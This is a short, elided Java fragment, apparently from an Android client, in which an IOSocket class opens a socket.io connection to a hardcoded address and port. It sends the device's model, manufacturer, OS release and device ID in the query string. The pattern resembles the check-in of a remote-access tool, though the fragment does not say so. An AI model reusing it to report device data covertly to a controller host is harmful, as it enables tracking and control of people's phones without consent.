...
public class IOSocket {
    ...
    private IOSocket() {
        try {
            ...
            ioSocket = IO.socket("http://192.168.11.113:42474?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
